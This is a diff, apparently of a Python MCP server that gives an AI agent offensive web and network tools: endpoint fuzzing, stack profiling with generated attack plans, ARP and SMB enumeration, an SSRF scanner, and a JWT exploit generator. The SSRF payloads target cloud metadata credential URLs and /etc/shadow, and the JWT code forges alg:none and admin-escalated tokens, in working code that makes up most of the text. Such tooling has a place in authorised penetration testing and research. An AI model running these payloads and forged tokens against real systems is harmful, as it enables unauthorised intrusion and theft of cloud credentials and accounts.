-    
-    # Step 7: Parameter discovery on 422 endpoints
-    progress.update("Parameter discovery on 422 endpoints")
-    param_discoveries = []
-    param_endpoints = response_map.get("422", [])[:3]
-    common_params = ["id", "user", "email", "name", "token", "key", "q", "search", "page", "limit",
-                    "admin", "debug", "action", "type", "format", "callback"]
-    
-    for endpoint in param_endpoints:
-        ep_url = f"{url.rstrip('/')}/{endpoint['path'].lstrip('/')}"
-        for param in common_params:
-            param_url = f"{ep_url}?{param}=test"
-            param_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", param_url]
-            param_result = run_command_advanced(param_cmd, timeout=10, trace=trace)
-            code = param_result["stdout"].strip()
-            if code != "422":  # Different response = param accepted
-                param_discoveries.append({
-                    "path": endpoint["path"], "param": param,
-                    "status_without": "422", "status_with": code
-                })
-    
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "target": target,
-        "detected_stack": detected_tech,
-        "mode": mode,
-        "total_discovered": len(discovered),
-        "discovered_endpoints": discovered,
-        "accessible_200": response_map.get("200", []),
-        "auth_required_401": response_map.get("401", []),
-        "forbidden_403": response_map.get("403", []),
-        "method_denied_405": response_map.get("405", []),
-        "param_required_422": response_map.get("422", []),
-        "bypass_results": bypass_results,
-        "method_discoveries": method_discoveries,
-        "param_discoveries": param_discoveries,
-        "recommendations": [
-            f"Discovered {len(discovered)} endpoints total",
-            f"Found {len(bypass_results)} 403 bypasses" if bypass_results else "No 403 bypasses found",
-            f"Found {len(method_discoveries)} method variations" if method_discoveries else "No method variations",
-            f"Found {len(param_discoveries)} parameter hints" if param_discoveries else "No param hints",
-        ],
-    }
-    
-    output = chain_engine.enrich_with_context("context_fuzzer", target, output)
-    log_tool_execution("context_fuzzer", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def target_profiler(
-    target: str,
-    profile_depth: str = "standard",
-    timeout: int = 120
-) -> str:
-    """
-    Profiles target technology stack and generates customized attack vectors.
-    Creates stack-specific payloads (Golang, AWS, Node, PHP, Java, .NET).
-    Returns prioritized attack plan based on detected technologies.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("target_profiler", target, 6)
-    inputs = {"target": target, "profile_depth": profile_depth}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    
-    # Step 1: Multi-probe technology detection
-    progress.update("Multi-probe technology detection")
-    probes = {
-        "headers": ["curl", "-skI", "--max-time", "15", "-L", url],
-        "body": ["curl", "-sk", "--max-time", "15", "-L", url],
-        "error_404": ["curl", "-sk", "--max-time", "10", f"{url}/nonexistent_path_xyz123"],
-        "options": ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS", "-I", url],
-    }
-    
-    probe_results = {}
-    for name, cmd in probes.items():
-        result = run_command_advanced(cmd, timeout=20, trace=trace)
-        probe_results[name] = result["stdout"]
-    
-    # Step 2: Stack identification
-    progress.update("Stack identification")
-    all_content = " ".join(probe_results.values()).lower()
-    
-    profile = {
-        "web_server": None,
-        "language": None,
-        "framework": None,
-        "cloud_provider": None,
-        "waf": None,
-        "cms": None,
-        "api_type": None,
-        "database_hints": [],
-        "confidence": {},
-    }
-    
-    # Web server detection
-    server_patterns = {
-        "nginx": "server: nginx", "apache": "server: apache",
-        "iis": "server: microsoft-iis", "caddy": "server: caddy",
-        "gunicorn": "server: gunicorn", "uvicorn": "server: uvicorn",
-    }
-    for srv, pattern in server_patterns.items():
-        if pattern in all_content:
-            profile["web_server"] = srv
-            break
-    
-    # Language detection
-    lang_indicators = {
-        "golang": ["x-powered-by: go", "server: go", "goroutine", "gin-gonic", "echo", "fiber"],
-        "python": ["x-powered-by: python", "django", "flask", "fastapi", "gunicorn", "uvicorn"],
-        "php": ["x-powered-by: php", ".php", "laravel", "symfony", "codeigniter"],
-        "java": ["x-powered-by: java", "jsessionid", "spring", "tomcat", "jetty"],
-        "node": ["x-powered-by: express", "node", "next.js", "nuxt"],
-        "ruby": ["x-powered-by: ruby", "rails", "sinatra", "puma"],
-        "dotnet": ["x-powered-by: asp.net", "x-aspnet-version", ".aspx", "blazor"],
-    }
-    for lang, indicators in lang_indicators.items():
-        if any(ind in all_content for ind in indicators):
-            profile["language"] = lang
-            profile["confidence"]["language"] = "high"
-            break
-    
-    # Cloud provider detection
-    cloud_patterns = {
-        "aws": ["x-amzn-", "x-amz-", "amazons3", "awselb", "cloudfront", "amazonaws"],
-        "gcp": ["x-goog-", "google cloud", "gfe", "appengine"],
-        "azure": ["x-ms-", "azure", "windows-azure", "trafficmanager"],
-        "cloudflare": ["cf-ray", "server: cloudflare"],
-    }
-    for cloud, patterns in cloud_patterns.items():
-        if any(p in all_content for p in patterns):
-            profile["cloud_provider"] = cloud
-            break
-    
-    # WAF detection
-    waf_patterns = {
-        "cloudflare": ["cf-ray", "server: cloudflare"],
-        "aws_waf": ["x-amzn-waf", "awswaf"],
-        "modsecurity": ["mod_security", "modsecurity"],
-        "imperva": ["incap_ses", "x-iinfo"],
-        "akamai": ["akamai", "x-akamai"],
-        "f5": ["x-wa-info", "bigip"],
-    }
-    for waf, patterns in waf_patterns.items():
-        if any(p in all_content for p in patterns):
-            profile["waf"] = waf
-            break
-    
-    # Step 3: Generate stack-specific attack vectors
-    progress.update("Generating attack vectors")
-    attack_vectors = []
-    
-    if profile["language"] == "golang":
-        attack_vectors.extend([
-            {"vector": "Golang debug endpoints", "paths": ["/debug/pprof/", "/debug/vars", "/metrics"],
-             "severity": "HIGH", "category": "info_disclosure"},
-            {"vector": "Golang template injection", "payloads": ["{{.}}", "{{printf \"%v\" .}}"],
-             "severity": "CRITICAL", "category": "ssti"},
-            {"vector": "Golang race condition", "detail": "Test concurrent requests on state-changing endpoints",
-             "severity": "HIGH", "category": "logic"},
-        ])
-    
-    if profile["language"] == "python":
-        attack_vectors.extend([
-            {"vector": "Python debug mode", "paths": ["/debug", "/?__debugger__=yes"],
-             "severity": "HIGH", "category": "info_disclosure"},
-            {"vector": "Jinja2 SSTI", "payloads": ["{{7*7}}", "{{config}}", "{{request.environ}}"],
-             "severity": "CRITICAL", "category": "ssti"},
-        ])
-    
-    if profile["language"] == "php":
-        attack_vectors.extend([
-            {"vector": "PHP info disclosure", "paths": ["/phpinfo.php", "/info.php"],
-             "severity": "HIGH", "category": "info_disclosure"},
-            {"vector": "PHP type juggling", "detail": "Test == vs === in auth",
-             "severity": "HIGH", "category": "auth_bypass"},
-        ])
-    
-    if profile["cloud_provider"] == "aws":
-        attack_vectors.extend([
-            {"vector": "AWS metadata SSRF", "payloads": ["http://169.254.169.254/latest/meta-data/"],
-             "severity": "CRITICAL", "category": "ssrf"},
-            {"vector": "S3 bucket enumeration", "detail": "Test common bucket naming patterns",
-             "severity": "HIGH", "category": "cloud"},
-            {"vector": "AWS credentials exposure", "paths": ["/.aws/credentials", "/.env"],
-             "severity": "CRITICAL", "category": "credentials"},
-        ])
-    
-    if profile["waf"]:
-        waf_bypasses = AdvancedPayloads.waf_bypass_payloads()
-        attack_vectors.append({
-            "vector": f"WAF bypass ({profile['waf']})",
-            "techniques": list(waf_bypasses.keys()),
-            "severity": "HIGH", "category": "waf_bypass"
-        })
-    
-    # Step 4: Priority ranking
-    progress.update("Priority ranking")
-    # Sort by severity
-    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
-    attack_vectors.sort(key=lambda x: severity_order.get(x.get("severity", "LOW"), 4))
-    
-    # Step 5: Generate recommended tool chain
-    progress.update("Generating tool chain recommendations")
-    recommended_tools = []
-    if profile["cloud_provider"] == "aws":
-        recommended_tools.extend(["ssrf_scanner", "context_fuzzer", "smart_vulnerability_detector"])
-    if profile["language"]:
-        recommended_tools.extend(["ssti_scanner", "nuclei_scan", "api_endpoint_discovery"])
-    if profile["waf"]:
-        recommended_tools.extend(["waf_fingerprint", "context_fuzzer"])
-    recommended_tools.extend(["header_security_audit", "cors_scanner"])
-    
-    output = {
-        "status": "success",
-        "target": target,
-        "profile": profile,
-        "attack_vectors": attack_vectors,
-        "recommended_tool_chain": list(dict.fromkeys(recommended_tools)),
-        "execution_order": [
-            "Phase 1: context_fuzzer (discover endpoints)",
-            "Phase 2: smart_vulnerability_detector (critical vulns)",
-            "Phase 3: Stack-specific injection testing",
-            "Phase 4: Deep exploitation of confirmed vulns",
-        ],
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("target_profiler", target, output)
-    log_tool_execution("target_profiler", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-
-
-# ============================================================================
-# ENHANCED MODULES — PHASE 2: DEEP TOOL UPGRADES
-# ============================================================================
-
-@mcp.tool()
-@resolve_references
-async def advanced_arp_discovery(
-    network: str = "192.168.1.0/24",
-    mode: str = "auto",
-    timeout: int = 60
-) -> str:
-    """
-    Enhanced network discovery with multiple fallback modes.
-    Mode: auto (try all), arp (requires root), nmap_ping, ip_neighbor, proc_arp
-    Detects: Rogue DHCP, ARP spoofing, undocumented devices, IP conflicts.
-    """
-    target = InputValidator.sanitize_target(network)
-    trace, progress, exec_dir = _init_tool_context("advanced_arp_discovery", target, 6)
-    inputs = {"network": network, "mode": mode}
-    
-    hosts_discovered = []
-    method_used = None
-    
-    # Step 1: Try arp-scan (requires root/CAP_NET_RAW)
-    progress.update("Trying arp-scan")
-    if mode in ["auto", "arp"]:
-        arp_cmd = ["arp-scan", "--localnet", "-q"]
-        if network != "192.168.1.0/24":
-            arp_cmd = ["arp-scan", network, "-q"]
-        result = run_command_advanced(arp_cmd, timeout=30, trace=trace)
-        if result["success"] and result["stdout"].strip():
-            method_used = "arp-scan"
-            for line in result["stdout"].split("\n"):
-                parts = line.split("\t")
-                if len(parts) >= 3 and re.match(r"\d+\.\d+\.\d+\.\d+", parts[0]):
-                    hosts_discovered.append({
-                        "ip": parts[0], "mac": parts[1], "vendor": parts[2] if len(parts) > 2 else "Unknown"
-                    })
-    
-    # Step 2: Fallback - nmap ping scan
-    if not hosts_discovered and mode in ["auto", "nmap_ping"]:
-        progress.update("Fallback: nmap ping scan")
-        nmap_cmd = ["nmap", "-sn", "-n", network]
-        result = run_command_advanced(nmap_cmd, timeout=45, trace=trace)
-        if result["success"]:
-            method_used = "nmap-ping"
-            ip_pattern = re.compile(r"Nmap scan report for (\d+\.\d+\.\d+\.\d+)")
-            mac_pattern = re.compile(r"MAC Address: ([0-9A-F:]+)\s*\((.*)\)", re.IGNORECASE)
-            current_ip = None
-            for line in result["stdout"].split("\n"):
-                ip_match = ip_pattern.search(line)
-                if ip_match:
-                    current_ip = ip_match.group(1)
-                mac_match = mac_pattern.search(line)
-                if mac_match and current_ip:
-                    hosts_discovered.append({
-                        "ip": current_ip, "mac": mac_match.group(1), "vendor": mac_match.group(2)
-                    })
-                    current_ip = None
-                elif current_ip and "Host is up" in line:
-                    hosts_discovered.append({"ip": current_ip, "mac": "N/A", "vendor": "N/A"})
-                    current_ip = None
-    
-    # Step 3: Fallback - ip neighbor
-    if not hosts_discovered and mode in ["auto", "ip_neighbor"]:
-        progress.update("Fallback: ip neighbor")
-        ip_cmd = ["ip", "neighbor", "show"]
-        result = run_command_advanced(ip_cmd, timeout=10, trace=trace)
-        if result["success"]:
-            method_used = "ip-neighbor"
-            for line in result["stdout"].split("\n"):
-                parts = line.split()
-                if len(parts) >= 5 and "lladdr" in parts:
-                    ip = parts[0]
-                    mac_idx = parts.index("lladdr") + 1
-                    mac = parts[mac_idx] if mac_idx < len(parts) else "N/A"
-                    state = parts[-1] if parts else "unknown"
-                    hosts_discovered.append({"ip": ip, "mac": mac, "vendor": "N/A", "state": state})
-    
-    # Step 4: Fallback - /proc/net/arp
-    if not hosts_discovered and mode in ["auto", "proc_arp"]:
-        progress.update("Fallback: /proc/net/arp")
-        result = run_command_advanced(["cat", "/proc/net/arp"], timeout=5, trace=trace)
-        if result["success"]:
-            method_used = "proc-arp"
-            for line in result["stdout"].split("\n")[1:]:  # Skip header
-                parts = line.split()
-                if len(parts) >= 4:
-                    hosts_discovered.append({
-                        "ip": parts[0], "mac": parts[3], "vendor": "N/A",
-                        "flags": parts[2] if len(parts) > 2 else ""
-                    })
-    
-    # Step 5: Security analysis
-    progress.update("Security analysis")
-    security_alerts = []
-    
-    # Check for duplicate IPs (IP conflict)
-    ip_list = [h["ip"] for h in hosts_discovered]
-    for ip in set(ip_list):
-        if ip_list.count(ip) > 1:
-            security_alerts.append({
-                "type": "IP_CONFLICT", "severity": "HIGH",
-                "detail": f"Multiple hosts claim IP {ip} - possible ARP spoofing"
-            })
-    
-    # Check for duplicate MACs (spoofing indicator)
-    mac_list = [h.get("mac", "N/A") for h in hosts_discovered if h.get("mac") != "N/A"]
-    for mac in set(mac_list):
-        if mac_list.count(mac) > 1:
-            ips_with_mac = [h["ip"] for h in hosts_discovered if h.get("mac") == mac]
-            security_alerts.append({
-                "type": "MAC_DUPLICATE", "severity": "CRITICAL",
-                "detail": f"MAC {mac} appears on multiple IPs: {ips_with_mac} - ARP SPOOFING?"
-            })
-    
-    # Check for common gateway IPs
-    gateway_ips = [h for h in hosts_discovered if h["ip"].endswith(".1") or h["ip"].endswith(".254")]
-    if len(gateway_ips) > 2:
-        security_alerts.append({
-            "type": "ROGUE_GATEWAY", "severity": "CRITICAL",
-            "detail": f"Multiple gateway-like IPs detected - possible rogue DHCP/gateway"
-        })
-    
-    output = {
-        "status": "success",
-        "network": network,
-        "method_used": method_used or "none_available",
-        "hosts_found": len(hosts_discovered),
-        "hosts": hosts_discovered,
-        "security_alerts": security_alerts,
-        "fallback_chain": "arp-scan → nmap -sn → ip neighbor → /proc/net/arp",
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("advanced_arp_discovery", target, output)
-    log_tool_execution("advanced_arp_discovery", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def advanced_smb_enum(
-    target: str,
-    mode: str = "auto",
-    username: str = "",
-    password: str = "",
-    timeout: int = 120
-) -> str:
-    """
-    Enhanced SMB/Windows enumeration with multiple tool fallbacks.
-    Uses: enum4linux, smbmap, smbclient, crackmapexec, nmap smb scripts.
-    Detects: Null sessions, guest access, weak shares, domain misconfig.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("advanced_smb_enum", target, 7)
-    inputs = {"target": target, "mode": mode}
-    
-    findings = {"shares": [], "users": [], "groups": [], "policies": [], "vulnerabilities": []}
-    method_used = []
-    
-    # Step 1: Check SMB port availability
-    progress.update("Checking SMB port")
-    port_check = run_command_advanced(
-        ["bash", "-c", f"echo | timeout 5 bash -c 'cat < /dev/tcp/{target}/445' 2>/dev/null && echo OPEN || echo CLOSED"],
-        timeout=10, trace=trace
-    )
-    smb_open = "OPEN" in port_check.get("stdout", "")
-    
-    if not smb_open:
-        # Try with nmap
-        nmap_check = run_command_advanced(["nmap", "-p", "445", "-Pn", "--open", target], timeout=15, trace=trace)
-        smb_open = "445/tcp" in nmap_check.get("stdout", "") and "open" in nmap_check.get("stdout", "")
-    
-    if not smb_open:
-        output = {
-            "status": "success", "target": target,
-            "smb_port_open": False,
-            "detail": "Port 445 (SMB) is closed/filtered on target",
-            "recommendation": "SMB enumeration not applicable - try other services"
-        }
-        progress.update("Complete")
-        output = chain_engine.enrich_with_context("advanced_smb_enum", target, output)
-        log_tool_execution("advanced_smb_enum", target, inputs, output, trace, progress)
-        return json.dumps(output, indent=2)
-    
-    # Step 2: Try enum4linux
-    progress.update("Trying enum4linux")
-    enum4linux_cmd = ["enum4linux", "-a", target]
-    if username:
-        enum4linux_cmd.extend(["-u", username, "-p", password or ""])
-    result = run_command_advanced(enum4linux_cmd, timeout=60, trace=trace)
-    if result["success"] and len(result["stdout"]) > 100:
-        method_used.append("enum4linux")
-        # Parse shares
-        for line in result["stdout"].split("\n"):
-            if "Mapping:" in line or "disk" in line.lower():
-                findings["shares"].append(line.strip())
-            if "user:" in line.lower():
-                findings["users"].append(line.strip())
-    
-    # Step 3: Try smbmap
-    progress.update("Trying smbmap")
-    smbmap_cmd = ["smbmap", "-H", target]
-    if username:
-        smbmap_cmd.extend(["-u", username, "-p", password or ""])
-    else:
-        smbmap_cmd.extend(["-u", "", "-p", ""])  # Null session
-    result = run_command_advanced(smbmap_cmd, timeout=30, trace=trace)
-    if result["success"]:
-        method_used.append("smbmap")
-        for line in result["stdout"].split("\n"):
-            if "READ" in line or "WRITE" in line or "NO ACCESS" in line:
-                findings["shares"].append(line.strip())
-                if "WRITE" in line:
-                    findings["vulnerabilities"].append({
-                        "type": "WRITABLE_SHARE", "severity": "CRITICAL",
-                        "detail": f"Writable share found: {line.strip()}"
-                    })
-    
-    # Step 4: Try smbclient for null session
-    progress.update("Null session testing")
-    smbclient_cmd = ["smbclient", "-N", "-L", f"//{target}"]
-    result = run_command_advanced(smbclient_cmd, timeout=15, trace=trace)
-    if result["success"] and "Sharename" in result["stdout"]:
-        method_used.append("smbclient-null")
-        findings["vulnerabilities"].append({
-            "type": "NULL_SESSION", "severity": "HIGH",
-            "detail": "Anonymous/null session SMB access possible"
-        })
-    
-    # Step 5: Nmap SMB scripts
-    progress.update("Nmap SMB scripts")
-    nmap_smb_cmd = ["nmap", "-p", "445", "--script", 
-                    "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln-*",
-                    "-Pn", target]
-    result = run_command_advanced(nmap_smb_cmd, timeout=60, trace=trace)
-    if result["success"]:
-        method_used.append("nmap-smb-scripts")
-        stdout = result["stdout"]
-        if "message_signing: disabled" in stdout.lower():
-            findings["vulnerabilities"].append({
-                "type": "SMB_SIGNING_DISABLED", "severity": "HIGH",
-                "detail": "SMB message signing disabled - MITM possible"
-            })
-        if "smb-vuln-ms17-010" in stdout:
-            findings["vulnerabilities"].append({
-                "type": "ETERNALBLUE", "severity": "CRITICAL",
-                "detail": "MS17-010 (EternalBlue) vulnerability detected!"
-            })
-        if "guest" in stdout.lower() and "account" in stdout.lower():
-            findings["vulnerabilities"].append({
-                "type": "GUEST_ACCOUNT", "severity": "HIGH",
-                "detail": "Guest account appears to be enabled"
-            })
-    
-    # Step 6: Security summary
-    progress.update("Security analysis")
-    output = {
-        "status": "success",
-        "target": target,
-        "smb_port_open": True,
-        "methods_used": method_used,
-        "shares": list(set(findings["shares"])),
-        "users": list(set(findings["users"])),
-        "vulnerabilities": findings["vulnerabilities"],
-        "total_vulns": len(findings["vulnerabilities"]),
-        "critical_count": len([v for v in findings["vulnerabilities"] if v.get("severity") == "CRITICAL"]),
-        "fallback_chain": "enum4linux → smbmap → smbclient → nmap smb-scripts",
-    }
-    
-    progress.update("Complete")
-    output = chain_engine.enrich_with_context("advanced_smb_enum", target, output)
-    log_tool_execution("advanced_smb_enum", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def enhanced_ssrf_scanner(
-    target: str,
-    params: str = "url,redirect,uri,path,next,link,proxy,file,document,src,href,dest,target,rurl,return,window,data,reference,site,html,val,validate,domain,callback,feed,host,port,to,out,view,dir,show,navigation,open,img,load,content",
-    include_cloud: bool = True,
-    include_internal: bool = True,
-    timeout: int = 180
-) -> str:
-    """
-    Enhanced SSRF scanner with cloud metadata, internal network, and protocol-specific payloads.
-    Tests: AWS/GCP/Azure metadata, internal services (Redis, MySQL, ES, etc.), file:// and gopher://.
-    """
-    target = InputValidator.sanitize_target(target)
-    trace, progress, exec_dir = _init_tool_context("enhanced_ssrf_scanner", target, 6)
-    inputs = {"target": target, "params": params, "include_cloud": include_cloud}
-    
-    url = target if target.startswith("http") else f"https://{target}"
-    param_list = [p.strip() for p in params.split(",")]
-    ssrf_findings = []
-    
-    # Build SSRF payloads
-    progress.update("Building SSRF payloads")
-    payloads = []
-    
-    if include_cloud:
-        # AWS metadata
-        payloads.extend([
-            ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
-            ("aws_iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
-            ("aws_userdata", "http://169.254.169.254/latest/user-data"),
-            ("aws_identity", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
-            ("aws_ecs", "http://169.254.170.2/v2/credentials"),
-            # GCP metadata
-            ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
-            ("gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
-            # Azure metadata
-            ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
-        ])
-    
-    if include_internal:
-        # Internal services
-        payloads.extend([
-            ("localhost", "http://127.0.0.1/"),
-            ("localhost_admin", "http://127.0.0.1/admin"),
-            ("redis", "http://127.0.0.1:6379/"),
-            ("elasticsearch", "http://127.0.0.1:9200/"),
-            ("mysql", "http://127.0.0.1:3306/"),
-            ("postgres", "http://127.0.0.1:5432/"),
-            ("mongodb", "http://127.0.0.1:27017/"),
-            ("memcached", "http://127.0.0.1:11211/"),
-            ("docker_api", "http://127.0.0.1:2375/containers/json"),
-            ("kubernetes_api", "http://127.0.0.1:10250/pods"),
-            ("internal_10", "http://10.0.0.1/"),
-            ("internal_172", "http://172.16.0.1/"),
-            ("internal_192", "http://192.168.1.1/"),
-        ])
-    
-    # Protocol payloads
-    payloads.extend([
-        ("file_passwd", "file:///etc/passwd"),
-        ("file_hosts", "file:///etc/hosts"),
-        ("file_shadow", "file:///etc/shadow"),
-    ])
-    
-    # Step 2: Test each param with each payload
-    progress.update("Testing SSRF payloads", f"{len(param_list)} params x {len(payloads)} payloads")
-    
-    # Get baseline response for comparison
-    baseline_cmd = ["curl", "-sk", "--max-time", "10", url]
-    baseline_result = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
-    baseline_size = len(baseline_result.get("stdout", ""))
-    
-    for param in param_list[:15]:  # Limit params
-        for payload_name, payload_url in payloads[:15]:  # Limit payloads
-            test_url = f"{url}?{param}={payload_url}"
-            test_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}|%{size_download}", test_url]
-            result = run_command_advanced(test_cmd, timeout=15, trace=trace)
-            
-            stdout = result.get("stdout", "")
-            # Check for SSRF indicators
-            ssrf_indicators = {
-                "aws_metadata": ["ami-id", "instance-id", "local-ipv4", "security-credentials"],
-                "gcp_metadata": ["computeMetadata", "service-accounts", "access_token"],
-                "azure_metadata": ["subscriptionId", "resourceGroupName"],
-                "redis": ["redis_version", "REDIS"],
-                "elasticsearch": ["cluster_name", "elasticsearch", "tagline"],
-                "file_passwd": ["root:x:0", "/bin/bash", "/bin/sh"],
-                "docker_api": ["Container", "Image", "Created"],
-                "kubernetes_api": ["Pod", "namespace", "container"],
+            # Full or technical report with intelligence
+            correlation = vuln_correlator.correlate(target)
+            kc = kill_chain.get_progress(target)
+            results["summary"] = {
+                "total_findings": context["total_findings"],
+                "finding_types": context["finding_types"],
+                "tech_stack": context.get("tech_stack", {}),
+                "decisions": context.get("decisions", []),
             }
-            
-            indicators = ssrf_indicators.get(payload_name, [])
-            if any(ind in stdout for ind in indicators):
-                ssrf_findings.append({
-                    "type": "CONFIRMED_SSRF", "severity": "CRITICAL",
-                    "param": param, "payload": payload_url, "payload_name": payload_name,
-                    "evidence": stdout[:200],
-                    "detail": f"SSRF confirmed via param '{param}' to {payload_name}"
-                })
-            elif len(stdout) > baseline_size * 1.5 and len(stdout) > 100:
-                # Significant size difference might indicate SSRF
-                ssrf_findings.append({
-                    "type": "POSSIBLE_SSRF", "severity": "HIGH",
-                    "param": param, "payload": payload_url, "payload_name": payload_name,
-                    "detail": f"Response size anomaly (baseline:{baseline_size}, got:{len(stdout)})"
-                })
-    
-    # Step 3: Time-based SSRF detection
-    progress.update("Time-based SSRF detection")
-    import time
-    for param in param_list[:5]:
-        # Use a non-routable IP to detect blind SSRF via timeout
-        start = time.time()
-        timeout_url = f"{url}?{param}=http://10.255.255.1/"
-        timeout_cmd = ["curl", "-sk", "--max-time", "8", timeout_url]
-        run_command_advanced(timeout_cmd, timeout=12, trace=trace)
-        elapsed = time.time() - start
-        if elapsed > 5:  # If it takes more than 5s, backend might be trying to connect
-            ssrf_findings.append({
-                "type": "BLIND_SSRF_TIMEOUT", "severity": "MEDIUM",
-                "param": param, "elapsed": f"{elapsed:.1f}s",
-                "detail": f"Param '{param}' causes timeout delay ({elapsed:.1f}s) - possible blind SSRF"
-            })
-    
-    progress.update("Complete")
-    output = {
-        "status": "success",
-        "target": target,
-        "params_tested": min(len(param_list), 15),
-        "payloads_tested": min(len(payloads), 15),
-        "total_findings": len(ssrf_findings),
-        "confirmed_ssrf": [f for f in ssrf_findings if f["type"] == "CONFIRMED_SSRF"],
-        "possible_ssrf": [f for f in ssrf_findings if f["type"] == "POSSIBLE_SSRF"],
-        "blind_ssrf": [f for f in ssrf_findings if f["type"] == "BLIND_SSRF_TIMEOUT"],
-        "all_findings": ssrf_findings,
-        "payloads_used": [p[0] for p in payloads[:15]],
-    }
-    
-    output = chain_engine.enrich_with_context("enhanced_ssrf_scanner", target, output)
-    log_tool_execution("enhanced_ssrf_scanner", target, inputs, output, trace, progress)
-    return json.dumps(output, indent=2)
-
-
-@mcp.tool()
-@resolve_references
-async def enhanced_jwt_analyzer(
-    token: str = "",
-    target: str = "",
-    test_exploits: bool = True,
-    timeout: int = 60
-) -> str:
-    """
-    Enhanced JWT analysis with exploit testing.
-    Tests: alg:none bypass, HS256/RS256 key confusion, expired token reuse,
-    signature stripping, claim manipulation, kid injection.
-    """
-    trace, progress, exec_dir = _init_tool_context("enhanced_jwt_analyzer", target or "jwt_analysis", 6)
-    inputs = {"token": token[:50] + "...", "target": target, "test_exploits": test_exploits}
-    
-    findings = []
-    
-    # Step 1: Decode JWT
-    progress.update("Decoding JWT")
-    parts = token.split(".")
-    if len(parts) != 3:
-        output = {"status": "error", "detail": "Invalid JWT format (expected 3 parts)"}
-        log_tool_execution("enhanced_jwt_analyzer", target or "jwt", inputs, output, trace, progress)
-        return json.dumps(output, indent=2)
-    
-    import base64
-    def decode_jwt_part(part):
-        padding = 4 - len(part) % 4
-        part += "=" * padding
-        try:
-            return json.loads(base64.urlsafe_b64decode(part))
-        except Exception:
-            return {}
-    
-    header = decode_jwt_part(parts[0])
-    payload_data = decode_jwt_part(parts[1])
-    
-    # Step 2: Algorithm analysis
-    progress.update("Algorithm analysis")
-    alg = header.get("alg", "unknown")
-    
-    if alg.lower() == "none" or alg == "":
-        findings.append({
-            "type": "ALG_NONE", "severity": "CRITICAL",
-            "detail": "JWT uses 'none' algorithm - NO SIGNATURE VERIFICATION!"
-        })
-    elif alg in ["HS256", "HS384", "HS512"]:
-        findings.append({
-            "type": "SYMMETRIC_ALG", "severity": "MEDIUM",
-            "detail": f"JWT uses symmetric algorithm ({alg}) - susceptible to key brute-force"
-        })
-    
-    # Check for weak kid parameter
-    kid = header.get("kid", "")
-    if kid:
-        # kid injection possibilities
-        if any(c in kid for c in ["../", "/", "\\", ";", "|"]):
-            findings.append({
-                "type": "KID_INJECTION", "severity": "CRITICAL",
-                "detail": f"Suspicious kid parameter: {kid} - possible path traversal/injection"
-            })
-        findings.append({
-            "type": "KID_PRESENT", "severity": "INFO",
-            "detail": f"kid parameter: {kid} - test with kid manipulation"
-        })
-    
-    # Step 3: Claim analysis
-    progress.update("Claim analysis")
-    
-    # Check expiration
-    exp = payload_data.get("exp")
-    if exp:
-        import time as time_module
-        if exp < time_module.time():
-            findings.append({
-                "type": "EXPIRED_TOKEN", "severity": "HIGH",
-                "detail": f"Token expired at {datetime.datetime.fromtimestamp(exp).isoformat()}"
-            })
-    else:
-        findings.append({
-            "type": "NO_EXPIRATION", "severity": "HIGH",
-            "detail": "Token has no expiration claim - never expires!"
-        })
-    
-    # Check for sensitive claims
-    sensitive_claims = ["role", "admin", "is_admin", "isAdmin", "permissions", "scope", "groups"]
-    found_sensitive = {k: v for k, v in payload_data.items() if k in sensitive_claims}
-    if found_sensitive:
-        findings.append({
-            "type": "SENSITIVE_CLAIMS", "severity": "MEDIUM",
-            "detail": f"Sensitive claims in payload: {found_sensitive}",
-            "exploitable": "Try changing role/admin values in token"
-        })
-    
-    # Step 4: Exploit generation
-    progress.update("Generating exploit tokens")
-    exploits = []
-    
-    if test_exploits:
-        # alg:none attack
-        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
-        none_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
-        exploits.append({
-            "name": "alg_none_bypass",
-            "token": f"{none_header}.{none_payload}.",
-            "description": "Token with alg:none - bypasses signature verification on vulnerable servers"
-        })
-        
-        # Signature stripping
-        exploits.append({
-            "name": "signature_strip",
-            "token": f"{parts[0]}.{parts[1]}.",
-            "description": "Token with empty signature"
-        })
-        
-        # Claim escalation
-        if "role" in payload_data or "admin" in payload_data:
-            escalated = payload_data.copy()
-            escalated["role"] = "admin"
-            escalated["admin"] = True
-            escalated["is_admin"] = True
-            esc_payload = base64.urlsafe_b64encode(json.dumps(escalated).encode()).decode().rstrip("=")
-            exploits.append({
-                "name": "privilege_escalation",
-                "token": f"{parts[0]}.{esc_payload}.{parts[2]}",
-                "description": "Token with escalated privileges (requires re-signing or alg:none)"
-            })
-        
-        # HS256/RS256 confusion
-        if alg.startswith("RS"):
-            findings.append({
-                "type": "KEY_CONFUSION_POSSIBLE", "severity": "HIGH",
-                "detail": f"Algorithm {alg} detected - test HS256/RS256 confusion attack",
-                "exploit": "Sign with HS256 using the public key as HMAC secret"
-            })
-    
-    # Step 5: Test exploits against target if provided
-    if target and test_exploits:
-        progress.update("Testing exploits against target")
